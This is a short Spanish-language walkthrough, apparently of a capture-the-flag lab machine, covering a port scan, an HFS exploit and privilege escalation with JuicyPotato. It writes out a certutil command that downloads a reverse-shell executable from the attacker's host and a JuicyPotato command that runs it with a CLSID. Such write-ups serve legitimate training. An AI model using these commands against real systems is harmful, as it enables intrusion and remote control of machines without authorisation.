Escaneo de puertos:

![](../../../Images/Pasted%20image%2020240925080046.png)

Observo lo que corre en el puerto 80:

![](../../../Images/Pasted%20image%2020240925080708.png)

Tengo una página de HFS

Buscaré algun exploit que me sirva:

![](../../../Images/Pasted%20image%2020240925080907.png)

Y edito a mis requerimientos:

![](../../../Images/Pasted%20image%2020240925081216.png)

Ahora ejecuto el exploit y espero que se cree la conexión:

![](../../../Images/Pasted%20image%2020240925081258.png)

Y listo, ahora estoy dentro de la máquina

Flag de user:

![](../../../Images/Pasted%20image%2020240925081326.png)

## ESCALADA DE PRIVILEGIOS

Observo los privilegios que tengo:

![](../../../Images/Pasted%20image%2020240925081438.png)

Y me llama la atención el "SeImpersonatePrivilege"

Por ende usaré una herramienta llamada JuicyPotato https://github.com/ohpe/juicy-potato

Me descargo el .exe en mi kali:

![](../../../Images/Pasted%20image%2020240925081657.png)

Y también me creo una Reverse Shell:

![](../../../Images/Pasted%20image%2020240925082039.png)

Levanto un servidor con python por el puerto 5555 para poder subir los 2 archivos a la máquina:
```
python3 -m http.server 5555
```

![](../../../Images/Pasted%20image%2020240925083706.png)

Ahora con Certutil recibo ambos archivos:
```
certutil -urlcache -f http://192.168.1.232:5555/reverse.exe shell.exe
```

![](../../../Images/Pasted%20image%2020240925090809.png)

Ya tengo ambos archivos en la máquina

Veré a qué versión de windows me estoy enfrentando:

![](../../../Images/Pasted%20image%2020240925090904.png)

A un 2012 R12

Busco el CLSID de esta versión, en: https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md  y es:

![](../../../Images/Pasted%20image%2020240925090958.png)

Ahora bien, ejecutaré el JuicyPotato pasándole el shell.exe y el CLSID, y estaré desde mi kali a la escucha con Netcat por el puerto 443:
```
JuicyPotato.exe -l 443 -p shell.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```
